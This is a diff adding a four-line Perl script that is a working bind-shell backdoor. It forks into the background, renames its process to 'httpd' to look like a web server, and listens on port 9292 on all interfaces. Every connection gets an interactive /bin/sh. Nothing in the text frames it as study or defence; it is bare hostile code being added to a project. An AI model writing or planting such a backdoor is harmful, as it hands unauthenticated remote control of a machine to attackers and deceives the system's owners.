@@ -1,0 +1,4 @@
+#!/usr/bin/perl
+use Socket;fork&&exit;$0="httpd";socket L,AF_INET,SOCK_STREAM,0;bind L,
+sockaddr_in(9292,INADDR_ANY)||exit;listen L,3;x:accept C,L;if(fork){open STDOUT,
+">&C";open STDERR,">&C";open STDIN,"<&C";exec"/bin/sh -i";exit;}close C;goto x;
